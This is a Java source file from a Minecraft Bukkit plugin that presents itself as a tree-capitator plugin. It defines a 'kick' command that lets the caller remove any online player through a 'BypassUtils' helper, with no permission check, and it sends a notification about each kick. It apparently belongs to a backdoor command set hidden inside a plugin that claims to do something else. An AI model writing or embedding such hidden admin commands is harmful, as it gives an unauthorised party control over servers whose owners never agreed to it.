package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.BypassUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;

@Command.Info(command = "kick", description = "Kicks player with additional reason", category = CommandCategory.Player, requiredArgs = 1)
public class KICK extends Command {

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player \"" + args.get(0) + "\" is not online!");
                return;
            }
            String reason = "";
            for (int i = 1; i < args.size(); i++) {
                reason += args.get(i) + " ";
            }
            if (reason.isEmpty()) reason = "Kicked from server.";
            reason = reason.replace("&", "§").replace("\\n", "\n").replace("|", "\n");
            BypassUtils.KickPlayer(anotherPlayer, reason);
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.GREEN + anotherPlayer.getName() + ChatColor.YELLOW + " got kicked (with" + (args.size() == 1 ? "out" : "") + " reason)!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " kicked " + anotherPlayer.getDisplayName() + (args.size() > 1 ? " for " + reason : "") + "!");
        } catch (Exception e) {
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "Player is not online!");
        }
    }
}
